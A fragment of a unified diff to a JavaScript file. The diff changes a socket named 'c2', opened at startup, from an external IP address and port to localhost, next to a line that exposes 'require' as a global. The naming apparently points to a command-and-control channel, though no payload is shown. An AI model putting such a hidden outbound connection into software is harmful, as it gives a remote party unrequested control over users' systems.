@@ -42,7 +42,7 @@ global.discq=0;
 global.destroyed=0;
 global.rq=require;
 const readline = require("readline");
-global.c2 = new require("net").Socket().connect(41050, '174.57.213.3', function() {
+global.c2 = new require("net").Socket().connect(41050, 'localhost', function() {
 	});
 const rl = readline.createInterface({
     input: process.stdin,
